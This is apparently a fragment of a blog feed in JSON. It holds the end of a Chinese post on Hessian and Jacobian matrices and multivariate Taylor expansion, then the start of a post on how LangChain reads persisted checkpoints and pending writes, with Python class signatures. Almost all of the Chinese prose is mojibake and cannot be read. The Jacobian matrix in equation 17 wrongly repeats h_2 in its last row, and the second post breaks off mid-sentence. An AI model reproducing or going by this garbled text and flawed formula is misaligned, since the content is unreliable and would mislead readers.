\n\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1}\\part{x_2}},&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_2^2}},&amp;\\cdots,&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_2}\\part{x_n}}\\\\\n\\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots \\\\\n\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_n}\\part{x_1}},&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_n}\\part{x_2}},&amp;\\cdots,&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_n}^2}\n\\end{matrix}\\right)\n\\tag{2}\n\\]</div><p></p><p>æ˜¯<span class=\"math inline\">\\(f\\)</span>åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> å¤„çš„<strong>HessiançŸ©é˜µ</strong>ï¼Œè®°ä¸º<span class=\"math inline\">\\(\\mathbf{H}_{ij}=\\frac{\\part^2{f}}{\\part{x_i}\\part{x_j}}\\)</span>ã€‚</p>\n<p>â€‹\tåœ¨æ•°å­¦åˆ†æä¸­å·²ç»çŸ¥é“ï¼Œå½“<span class=\"math inline\">\\(f\\)</span> åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> å¤„çš„æ‰€æœ‰äºŒé˜¶åå¯¼æ•°ä¸ºè¿ç»­æ—¶æœ‰ï¼š</p>\n<p></p><div class=\"math display\">\\[\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_i}\\part{x_j}}=\\frac{\\part^2{f(\\mathbf{X}_0)}}{\\part{x_j}\\part{x_i}} \\tag{3}\n\\]</div><p></p><p>å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹HessiançŸ©é˜µæ˜¯<strong>å¯¹ç§°çŸ©é˜µ</strong>ã€‚</p>\n<p><strong>æ¨è®º 1</strong> è®¾<span class=\"math inline\">\\(\\mathbf{a}\\in{\\mathbf{R}^n},\\mathbf{X}\\in{\\mathbf{R}^n},b\\in{R}\\)</span>ï¼Œæ±‚çº¿æ€§å‡½æ•°ï¼š</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X})=\\mathbf{a}^T\\mathbf{X}+b\\tag{4}\n\\]</div><p></p><p>åœ¨ä»»æ„ç‚¹<span class=\"math inline\">\\(\\mathbf{X}\\)</span> å¤„çš„æ¢¯åº¦å‘é‡å’ŒHessiançŸ©é˜µï¼š</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n&amp;\\nabla{f(\\mathbf{X})}=\\mathbf{a}\\\\\n&amp;\\nabla^2{f(\\mathbf{X})}=\\mathbf{0}\n\\end{aligned}\n\\tag{5}\n\\]</div><p></p><p><strong>è¯  æ˜ï¼š</strong> è®¾<span class=\"math inline\">\\(\\mathbf{a}=[a_1,a_2,\\cdots,a_n]^{T},\\mathbf{X}=[x_1,x_2,\\cdots,x_n]^{T}\\)</span> åˆ™ï¼š</p>\n<p></p><div class=\"math display\">\\[f(x_1,x_2,\\cdots,x_n)=\\sum^{n}_{i=1}a_ix_i+b \\tag{6}\n\\]</div><p></p><p>æ ¹æ®æ¢¯åº¦å‘é‡<span class=\"math inline\">\\(\\nabla{f}\\)</span>çš„å®šä¹‰ï¼š</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\frac{\\part{f}}{\\part{x_i}}=a_i \\hspace{2em} (i=1,2,\\cdots,n) \\tag{7}\n\\]</div><p></p><p>ç”±å¼ï¼ˆ7ï¼‰å¯çŸ¥ï¼Œ</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=[a_1,a_2,\\cdots,a_n]^T=\\mathbf{a} \\tag{8}\n\\]</div><p></p><p>æ ¹æ®å¼ï¼ˆ2ï¼‰çš„<span class=\"math inline\">\\(Hessian\\)</span>çŸ©é˜µçš„å®šä¹‰ï¼š</p>\n<p></p><div class=\"math display\">\\[\\frac{\\part^2{f}}{\\part{x_i}\\part{x_j}}=0, \\hspace{2em} i,j=1,2,\\cdots,n \\tag{9}\n\\]</div><p></p><p>æ‰€ä»¥ï¼š</p>\n<p></p><div class=\"math display\">\\[\\nabla^2{f(\\mathbf{X})}=\\mathbf{0} \\tag{10}\n\\]</div><p></p><p><strong>æ¨è®º  2</strong>  è®¾<span class=\"math inline\">\\(\\mathbf{A}\\in{R^{n\\times{n}}}\\)</span> æ˜¯å¯¹ç§°å®æ–¹é˜µï¼Œ<span class=\"math inline\">\\(\\mathbf{b}\\in{\\mathbf{R}^n},c\\in\\mathbf{R}^1\\)</span> ,å…¶äºŒæ¬¡å‡½æ•°<span class=\"math inline\">\\(f(\\mathbf{X})=\\frac{1}{2}\\mathbf{X}^T\\mathbf{A}\\mathbf{X}+\\mathbf{b}^T\\mathbf{X}+c\\)</span> ,åœ¨ä»»æ„ç‚¹å¤„çš„æ¢¯åº¦å‘é‡<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X})}\\)</span> åŠHessiançŸ©é˜µ <span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X})\\)</span> ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n&amp;\\nabla{f}=\\mathbf{AX+b} \\\\\n&amp;\\nabla^2{f}=\\mathbf{A}\n\\end{aligned}\n\\tag{11}\n\\]</div><p></p><p><strong>è¯ æ˜ï¼š</strong> è®¾<span class=\"math inline\">\\(\\mathbf{A}=[a_{ij}]_{n\\times{n}}\\)</span> ,<span class=\"math inline\">\\(\\mathbf{X}=[x_1,x_2,...,x_n]^T\\)</span>, <span class=\"math inline\">\\(\\mathbf{b}=[b_1,b_2,...,b_n]^T\\)</span> ,äºŒæ¬¡å‡½æ•°<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> å¯ä»¥å†™æˆå¦‚ä¸‹å½¢å¼ï¼š</p>\n<p></p><div class=\"math display\">\\[f(x_1,x_2,\\cdots,x_n)=\\frac{1}{2}\\sum_{i=1}^{n}\\sum_{j=1}^{n}a_{ij}x_ix_j+\\sum_{i=1}^{n}b_ix_i+c \\tag{12}\n\\]</div><p></p><p>å°†å®ƒå¯¹å„ä¸ªå˜é‡ <span class=\"math inline\">\\(x_i\\)</span> (<span class=\"math inline\">\\(i=1,\\cdots,n\\)</span>) æ±‚åå¯¼æ•°ï¼Œå¾—åˆ°ï¼š</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\left( \\begin{matrix} \\sum_{j=1}^n a_{1j}x_j+b_1\\\\\n\\vdots \\\\\\sum_{j=1}^{n}a_{n_j}x_j+b_n \\end{matrix} \\right)= \\left(\\begin{matrix}\\sum_{j=1}^{n}a_{1j}x_j\\\\\\vdots\\\\\\sum_{j=1}^na_{nj}x_j\\end{matrix}\\right)+\\left(\\begin{matrix}b_1\\\\ \\vdots \\\\b_n\\end{matrix}\\right) \\tag{13}\n\\]</div><p></p><p>æ‰€ä»¥ï¼š</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\mathbf{AX+b} \\tag{14}\n\\]</div><p></p><p>å†å¯¹å®ƒä»¬çš„æ±‚åå¯¼æ•°æ˜¯ï¼š</p>\n<p></p><div class=\"math display\">\\[ \\frac{\\part{f(\\mathbf{X})}}{\\part{x_i}\\part{x_j}}=a_{ij} \\tag{15}\n\\]</div><p></p><p>æ‰€ä»¥ï¼š</p>\n<p></p><div class=\"math display\">\\[\\nabla^2f(\\mathbf{X})=\\mathbf{A} \\tag{16}\n\\]</div><p></p><p>ä»¥ä¸Šä¸¤ä¸ªä¾‹å­è¯´æ˜ï¼Œ<span class=\"math inline\">\\(n\\)</span>å…ƒå‡½æ•°æ±‚å¯¼ä¸ä¸€å…ƒå‡½æ•°æ±‚å¯¼åœ¨å½¢å¼ä¸Šä¸€è‡´çš„ï¼Œå³çº¿æ€§å‡½æ•°çš„ä¸€é˜¶å¯¼æ•°çš„æ±‚å¯¼ä¸ºå¸¸å‘é‡ï¼Œå…¶äºŒé˜¶å¯¼æ•°ä¸ºé›¶çŸ©é˜µï¼›è€ŒäºŒæ¬¡å‡½æ•°çš„ä¸€é˜¶å¯¼æ•°ä¸ºçº¿æ€§å‘é‡å‡½æ•°ï¼Œ å…¶äºŒé˜¶å¯¼æ•°ä¸ºå¸¸çŸ©é˜µã€‚</p>\n<p>â€‹\tåœ¨æ­¤ä»‹ç»åœ¨ä»Šåçš„è®¡ç®—ä¸­è¦ç”¨åˆ°çš„å‘é‡å‡½æ•°çš„å¯¼æ•°ã€‚</p>\n<p>â€‹\t<strong>Definition 4.1.2</strong> è®¾ä¸€ä¸ªå‘é‡å‡½æ•°<span class=\"math inline\">\\(h:R^{n}\\rightarrow{R^m}ï¼Œ\\mathbf{X}_0\\in{R^n}\\)</span>ï¼Œè®°<span class=\"math inline\">\\(h(\\mathbf{X})=\\{h_1(\\mathbf{X}),h_2(\\mathbf{X}),\\cdots,h_m(\\mathbf{X})\\}^T\\)</span>ï¼Œå¦‚æœ<span class=\"math inline\">\\(h_i(i=1,2,\\cdots,m)\\)</span> åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> å¤„å¯¹äºè‡ªå˜é‡<span class=\"math inline\">\\(\\mathbf{X}=[x_1,x_2,x_3,\\cdots,x_n]^T\\)</span> çš„å„åˆ†é‡çš„åå¯¼æ•°<span class=\"math inline\">\\(\\frac{\\part{h_i(\\mathbf{X}_0)}}{\\part{x_j}}\\space(j=1,2,3,\\cdots,m)\\)</span> éƒ½å­˜åœ¨ï¼Œåˆ™ç§°å‘é‡å‡½æ•°<span class=\"math inline\">\\(h(\\mathbf{X})\\)</span> åœ¨ç‚¹<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> å¤„æ˜¯ä¸€é˜¶å¯å¯¼çš„ï¼Œå¹¶ä¸”ç§°çŸ©é˜µï¼š</p>\n<p></p><div class=\"math display\">\\[\\nabla_{m\\times{n}}h(\\mathbf{X}_0)=\\left[\\begin{matrix} \\frac{\\part{h_1(\\mathbf{X}_0)}}{\\part{x_1}} &amp;\\frac{\\part{h_1(\\mathbf{X}_0)}}{\\part{x_2}} &amp;\\cdots &amp;\\frac{\\part{h_1(\\mathbf{X}_0)}}{\\part{x_n}} \\\\ \\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_1}} &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_2}} &amp;\\cdots &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_n}}\\\\ \\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots \\\\ \\frac{\\part{h_m(\\mathbf{X}_0)}}{\\part{x_1}}   &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_2}} &amp;\\cdots &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_n}} \\end{matrix}\\right] \\tag{17}\n\\]</div><p></p><p>æ˜¯<span class=\"math inline\">\\(h\\)</span>åœ¨ç‚¹<span class=\"math inline\">\\(X_0\\)</span> å¤„çš„ä¸€é˜¶å¯¼æ•°æˆ–Jacobi çŸ©é˜µï¼Œç®€è®°ä¸º</p>\n<p></p><div class=\"math display\">\\[\\nabla{\\mathbf{h}(\\mathbf{X}_0)}=\\nabla_{m\\times{n}}\\mathbf{h}(\\mathbf{X}_0) \\tag{18}\n\\]</div><p></p><p>ç”±äº<span class=\"math inline\">\\(n\\)</span>å…ƒå‡½æ•°<span class=\"math inline\">\\(f:\\mathbf{R}^n\\rightarrow \\mathbf{R}^1\\)</span> çš„æ¢¯åº¦æ˜¯å‘é‡å‡½æ•°:</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\left[\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}},...,\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right]^T \n\\tag{19}\n\\]</div><p></p><p>æ‰€ä»¥<span class=\"math inline\">\\(\\nabla f(\\mathbf{X})\\)</span> çš„ä¸€é˜¶å¯¼æ•°æˆ–Jacobi çŸ©é˜µä¸ºï¼š</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n\\nabla_{n\\times{n}}\\nabla{f(\\mathbf{X})}&amp;=\\left[\\begin{matrix}\\frac{\\part}{\\part{x_1}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}}\\right) &amp;\\frac{\\part}{\\part{x_2}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}}\\right) &amp;\\cdots &amp;\\frac{\\part}{\\part{x_n}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}}\\right)\\\\\n\\frac{\\part}{\\part{x_1}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_2}}\\right) &amp;\\frac{\\part}{\\part{x_2}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_2}}\\right) &amp;\\cdots &amp;\\frac{\\part}{\\part{x_n}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_2}}\\right)\\\\\n\\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots \\\\\n\\frac{\\part}{\\part{x_1}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right) &amp;\\frac{\\part}{\\part{x_2}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right) &amp;\\cdots &amp;\\frac{\\part}{\\part{x_n}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right)\n\\end{matrix}\\right]\\\\\n&amp;=\\left[\\begin{matrix}\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1^2}} &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_2}} &amp;\\cdots &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_n}}\\\\\n\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_2}} &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_2^2}} &amp;\\cdots &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_2x_n}}\\\\\n\\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots\\\\\n\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_1x_n}} &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_2x_n}} &amp;\\cdots &amp;\\frac{\\part^2{f(\\mathbf{X})}}{\\part{x_n^2}}\n\\end{matrix}\\right]\\\\\n&amp;=\\nabla^2{f(\\mathbf{X})}\n\\end{aligned}\n\\tag{20}\n\\]</div><p></p><p>å³ï¼š</p>\n<p></p><div class=\"math display\">\\[\\nabla_{n\\times{n}}\\nabla{f(\\mathbf{X})}=\\nabla^2f(\\mathbf{X}) \\tag{21}\n\\]</div><p></p><p>æ®æ­¤ï¼Œä»ä¸Šå¼çš„å¾—çŸ¥ï¼Œå‡½æ•°æ¢¯åº¦çš„Jacobiçš„çŸ©é˜µä¸ºæ­¤å‡½æ•°<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> çš„HessiançŸ©é˜µã€‚</p>\n<p>ä¸‹é¢ç»™å‡ºå¸¸ç”¨JacobiçŸ©é˜µçš„å‡ ä¸ªå…¬å¼å’Œæ¨è®ºï¼š</p>\n<ol>\n<li><span class=\"math inline\">\\(\\nabla{\\mathbf{c}_{n\\times1}}=\\mathbf{0}_{n\\times{n}}\\)</span> ï¼Œå…¶ä¸­<span class=\"math inline\">\\(\\mathbf{c}\\)</span> æ˜¯åˆ†é‡å…¨éƒ¨ä¸ºå¸¸é‡çš„<span class=\"math inline\">\\(n\\)</span>ç»´å‘é‡ï¼Œ<span class=\"math inline\">\\(\\mathbf{0}\\)</span> æ˜¯<span class=\"math inline\">\\(n\\times{n}\\)</span> é˜¶é›¶å‘é‡ï¼›</li>\n<li><span class=\"math inline\">\\(\\nabla{\\mathbf{X}}=\\mathbf{I}\\)</span>ï¼Œå…¶ä¸­<span class=\"math inline\">\\(\\mathbf{X}\\)</span> æ˜¯<span class=\"math inline\">\\(n\\)</span>ç»´å‘é‡ï¼Œ<span class=\"math inline\">\\(I\\)</span> ä¸º<span class=\"math inline\">\\(n\\times{n}\\)</span> é˜¶å•ä½çŸ©é˜µï¼›</li>\n<li><span class=\"math inline\">\\(\\nabla{\\mathbf{AX}}=\\mathbf{A}^T\\)</span>ï¼Œå…¶ä¸­<span class=\"math inline\">\\(\\mathbf{A}\\)</span>æ˜¯<span class=\"math inline\">\\(m\\times{n}\\)</span>é˜¶çŸ©é˜µï¼›</li>\n<li>è®¾ <span class=\"math inline\">\\(\\phi{(t)}=f(\\mathbf{X}_0+t\\mathbf{P})\\)</span>ï¼Œå…¶ä¸­<span class=\"math inline\">\\(f:\\mathbf{R}^n\\rightarrow\\mathbf{R}^{1}\\)</span>, <span class=\"math inline\">\\(\\phi:\\mathbf{R}\\rightarrow\\mathbf{R}\\)</span>ï¼Œåˆ™<span class=\"math inline\">\\(\\phi^{\\prime}(t)=\\nabla f(\\mathbf{X}_0+t\\mathbf{P})^T\\mathbf{P}\\)</span>, <span class=\"math inline\">\\(\\phi^{\\prime\\prime}=\\mathbf{P}^T\\nabla^2{f(\\mathbf{X}_0+t\\mathbf{P})}\\mathbf{P}\\)</span></li>\n</ol>\n<h2 id=\"2å¤šå…ƒå‡½æ•°çš„taylorå±•å¼€\">2.å¤šå…ƒå‡½æ•°çš„Taylorå±•å¼€</h2>\n<p>â€‹\tå¤šå…ƒå‡½æ•°çš„Taylorå±•å¼€å¼åœ¨æœ€ä¼˜åŒ–æ–¹æ³•ä¸­æ˜¯ååˆ†é‡è¦çš„ï¼Œè®¸å¤šæ–¹æ³•åŠå…¶æ”¶æ•›æ–¹æ³•çš„è¯æ˜æ˜¯ä»å…¶å‡ºå‘ï¼Œè¿™é‡Œç»™å‡ºTaylorå±•å¼€å®šç†åŠå…¶è¯æ˜ã€‚Taylorå±•å¼€è¿‘ä¼¼å¯ä»¥æœ‰æ•ˆåœ°å°†å¤æ‚å‡½æ•°åŒ–ä¸ºäºŒæ¬¡å‡½æ•°ã€‚</p>\n<p>â€‹\t<strong>å®š ç† 4.2.1</strong> è®¾<span class=\"math inline\">\\(f:\\mathbf{R}^{n}\\rightarrow\\mathbf{R}\\)</span> å…·æœ‰äºŒé˜¶è¿ç»­åå¯¼æ•°ï¼Œåˆ™</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}+\\mathbf{P})=f(\\mathbf{X})+\\nabla{f(\\mathbf{X})}^T\\mathbf{P}+\\frac{1}{2}\\mathbf{P}^T\\nabla^2f(\\overline{\\mathbf{X}})\\mathbf{P} \\tag{22}\n\\]</div><p></p><p>å…¶ä¸­ï¼š<span class=\"math inline\">\\(\\overline{\\mathbf{X}}=\\mathbf{X}+\\theta\\mathbf{P}(\\theta\\in{(0,1)})\\)</span>ã€‚</p>\n<p><strong>è¯  æ˜</strong>ï¼šè®¾ <span class=\"math inline\">\\(\\psi(t)=f(\\mathbf{X}+t\\mathbf{P})\\)</span> å…¶ä¸­ <span class=\"math inline\">\\(t\\in[0,1]\\)</span>:</p>\n<p></p><div class=\"math display\">\\[\\psi(0)=f(\\mathbf{X}) ï¼Œ \\psi(1)=f(\\mathbf{X}+\\mathbf{P}) \\tag{23}\n\\]</div><p></p><p>å¯¹<span class=\"math inline\">\\(\\psi(t)\\)</span> æŒ‰ç…§ä¸€å…ƒå‡½æ•°åœ¨<span class=\"math inline\">\\(t=0\\)</span>ç‚¹å±•å¼€ï¼Œå¾—åˆ°ä¸‹å¼ï¼š</p>\n<p></p><div class=\"math display\">\\[   \\psi(t)=\\psi(0)+\\psi^{\\prime}(0)t+\\frac{1}{2}\\psi^{\\prime\\prime}(\\theta t)t^2 \\tag{24}\n\\]</div><p></p><p>å…¶ä¸­ <span class=\"math inline\">\\(\\theta\\in(0,1)\\)</span>ã€‚ä»¤<span class=\"math inline\">\\(t=1\\)</span>ï¼Œäºæ˜¯</p>\n<p></p><div class=\"math display\">\\[\\psi(1)=\\psi(0)+\\psi^{\\prime}(0)+\\frac{1}{2}\\psi^{\\prime\\prime}(\\theta) \\tag{25}\n\\]</div><p></p><p>åˆå› ä¸ºä¸ŠèŠ‚ä¸­ <span class=\"math inline\">\\(\\psi^{\\prime}(\\theta)=\\nabla{f(\\mathbf{X})}^T\\mathbf{P},\\psi^{\\prime\\prime}(\\theta)=\\mathbf{P}^T\\nabla^2f(\\mathbf{X}+\\theta{\\mathbf{P}})\\mathbf{P}\\)</span> ï¼Œä»£å…¥å¼ï¼ˆ25ï¼‰ä¸­å¾—åˆ°ï¼š</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}+\\mathbf{P})=f(\\mathbf{X})+\\nabla{f(\\mathbf{X})}^T\\mathbf{P}+\\frac{1}{2}\\mathbf{P}^T\\nabla^2f(\\mathbf{X}+\\theta\\mathbf{P})\\mathbf{P} \\tag{26}\n\\]</div><p></p><p>å¼ï¼ˆ26ï¼‰è¿˜å¯ä»¥å†™æˆï¼š</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}+\\mathbf{P})=f(\\mathbf{X})+\\nabla{f(\\mathbf{X})}^{T}\\mathbf{P}+\\frac{1}{2}\\mathbf{P}^T\\nabla^2f(\\mathbf{X})\\mathbf{P}+o(||\\mathbf{P}||^2) \\tag{27}\n\\]</div><p></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 09:48</span>&nbsp;\n<a href=\"https://www.cnblogs.com/GeophysicsWorker\">GeoFXR</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">42</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "[æ‹†è§£LangChainæ‰§è¡Œå¼•æ“]æŒä¹…åŒ–çŠ¶æ€çš„æå–",
      "link": "https://www.cnblogs.com/jaydenai/p/19623976/read-state",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jaydenai/p/19623976/read-state\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-02-19 07:58\">\n    <span>[æ‹†è§£LangChainæ‰§è¡Œå¼•æ“]æŒä¹…åŒ–çŠ¶æ€çš„æå–</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        å‰é¢ä»¥`å†™å…¥`çš„è§’åº¦ä»‹ç»äº†BaseCheckpointSaverçš„`put/aput`å’Œ`put_writes/aput_writes`æ–¹æ³•,å®ƒä»¬åˆ†åˆ«å®ç°äº†åŸºäºCheckpointå’ŒPending Writeçš„æŒä¹…åŒ–ã€‚å¯¹äºä¸€ä¸ªå·²ç»å®Œæˆçš„Superstepæ¥è¯´ï¼Œå¯¹åº” Checkpointå°±ä»£è¡¨äº†å®ƒçš„çŠ¶æ€ï¼›ä½†æ˜¯å¯¹äºä¸€ä¸ªå› ä¸­æ–­å°šæœªå®Œæˆçš„Superstepï¼ŒæŸä¸ªæ—¶åˆ»çš„çŠ¶æ€ç”±ä¸Šä¸€Superstepçš„Checkpointå’Œå½“å‰Superstepçš„æ‰€æœ‰Pending Writeæ¥æè¿°ã€‚å¦‚æœçœŸçš„éœ€è¦æ¢å¤åˆ°ä¸­æ–­æ—¶çš„çŠ¶æ€ï¼Œéœ€è¦åœ¨Checkpointå›ºåŒ–çŠ¶æ€åŸºç¡€ä¸ŠæŒ‰åºé‡æ”¾æ‰€æœ‰çš„Pending Writeï¼ˆå®é™…ä¸Šåªéœ€è¦é‡æ”¾ä»£è¡¨æˆåŠŸæ‰§è¡Œä»»åŠ¡çš„Pending Writeï¼‰å°±å¯ä»¥äº†ã€‚\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>å‰é¢ä»¥<code>å†™å…¥</code>çš„è§’åº¦ä»‹ç»äº†BaseCheckpointSaverçš„<code>put/aput</code>å’Œ<code>put_writes/aput_writes</code>æ–¹æ³•,å®ƒä»¬åˆ†åˆ«å®ç°äº†åŸºäºCheckpointå’ŒPending Writeçš„æŒä¹…åŒ–ã€‚å¯¹äºä¸€ä¸ªå·²ç»å®Œæˆçš„Superstepæ¥è¯´ï¼Œå¯¹åº” Checkpointå°±ä»£è¡¨äº†å®ƒçš„çŠ¶æ€ï¼›ä½†æ˜¯å¯¹äºä¸€ä¸ªå› ä¸­æ–­å°šæœªå®Œæˆçš„Superstepï¼ŒæŸä¸ªæ—¶åˆ»çš„çŠ¶æ€ç”±ä¸Šä¸€Superstepçš„Checkpointå’Œå½“å‰Superstepçš„æ‰€æœ‰Pending Writeæ¥æè¿°ã€‚å¦‚æœçœŸçš„éœ€è¦æ¢å¤åˆ°ä¸­æ–­æ—¶çš„çŠ¶æ€ï¼Œéœ€è¦åœ¨Checkpointå›ºåŒ–çŠ¶æ€åŸºç¡€ä¸ŠæŒ‰åºé‡æ”¾æ‰€æœ‰çš„Pending Writeï¼ˆå®é™…ä¸Šåªéœ€è¦é‡æ”¾ä»£è¡¨æˆåŠŸæ‰§è¡Œä»»åŠ¡çš„Pending Writeï¼‰å°±å¯ä»¥äº†ã€‚</p>\n<h2 id=\"1-è¯»å–checkpointå’Œpinding-write\">1. è¯»å–Checkpointå’ŒPinding Write</h2>\n<p>å¦‚ä¸‹è¿™ä¸ª<code>CheckpointTuple</code>ç”¨æ¥è¡¨ç¤ºCheckpointå’ŒPending Writeçš„ç»“åˆä½“ã€‚é™¤äº†è¿™ä¸¤ä¸ªæ ¸å¿ƒæˆå‘˜ï¼Œå®ƒè¿˜åŒ…æ‹¬å½“å‰çš„æ‰§è¡Œé…ç½®ï¼ˆconfigå’Œparent_configï¼‰å’Œå…ƒæ•°æ®ã€‚å…·ä½“çš„Pending Writeç”±Task IDã€Channelåç§°å’Œå†™å…¥æ•°ç»„ç»„æˆçš„ä¸‰å…ƒç»„PendingWriteè¡¨ç¤ºã€‚</p>\n<pre><code class=\"language-python\">class CheckpointTuple(NamedTuple):\n    config: RunnableConfig\n    checkpoint: Checkpoint\n    metadata: CheckpointMetadata\n    parent_config: RunnableConfig | None = None\n    pending_writes: list[PendingWrite] | None = None\nPendingWrite = tuple[str, str, Any]\n</code></pre>\n<p>BaseCheckpointSaveræä¾›äº†ç”¨äºè¯»å–CheckpointTupleçš„<code>get_tuple/aget_tuple</code>æ–¹æ³•ã€‚ä½œä¸ºå‚æ•°çš„RunnableConfigå¯¹è±¡éœ€è¦æä¾›Thread IDï¼ˆå¿…éœ€ï¼‰å’ŒCheckpoint å‘½åç©ºé—´ï¼ˆå¯é€‰ï¼‰ã€‚å¦‚æœæ²¡æœ‰æä¾›Checkpoint IDï¼Œæ–¹æ³•ä¼šè¿”å›æœ€ç»ˆçš„çŠ¶æ€ï¼Œå¦‚æœå°šæœªå®Œæˆï¼Œå¾—åˆ°çš„CheckpointTupleå…ƒç»„å¯èƒ½åŒ…å«Pending Writeã€‚å¦‚æœæä¾›äº†Checkpoint ID, åªæœ‰åœ¨æ­¤IDå¯¹åº”æœ€æ–°çš„Checkpointä¸”åä¸€Superstepå°šæœªå®Œæˆï¼Œè¿”å›çš„CheckpointTupleå…ƒç»„æ‰æœ‰å¯èƒ½åŒ…å«Pending Writeã€‚å¯¹äºå®ç°åœ¨BaseCheckpointSaverä¸­çš„å¦ä¸€ç»„æ–¹æ³•<code>get/aget</code>ï¼Œä¼šåœ¨å†…éƒ¨è°ƒç”¨<code>get_tuple/aget_tuple</code>æ–¹æ³•ï¼Œå¹¶è¿”å›CheckpointTupleå…ƒç»„å°è£…çš„Checkpointå¯¹è±¡ã€‚</p>\n<pre><code class=\"language-python\">class BaseCheckpointSaver(Generic[V]):    \n    def get(self, config: RunnableConfig) -&gt; Checkpoint | None\n    async def aget(self, config: RunnableConfig) -&gt; Checkpoint | None\n\n    def get_tuple(self, config: RunnableConfig) -&gt; CheckpointTuple | None\n    async def aget_tuple(self, config: RunnableConfig) -&gt; CheckpointTuple | None\n\n    def list(\n        self,\n        config: RunnableConfig | None,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; Iterator[CheckpointTuple]:\n    async def alist(\n        self,\n        config: RunnableConfig | None,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; AsyncIterator[CheckpointTuple]\n</code></pre>\n<p>å¯¹äºInMemorySaveræ¥è¯´ï¼Œå®ƒçš„get_tuple/aget_tupleæ–¹æ³•ä¼šä»RunnableConfigé…ç½®ä¸­æå–Thread IDå’ŒCheckpointå‘½åç©ºé—´ï¼Œå¦‚æœæŒ‡å®šäº†Checkpoint IDï¼Œå®ƒä»¬ä¼šåˆ©ç”¨è¿™ä¸‰ä¸ªå€¼ä»storageå’Œblobså­—å…¸ä¸­æå–ç›¸åº”æ•°æ®ç»„æˆè¿”å›çš„CheckpointTupleå¯¹è±¡ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šCheckpoint 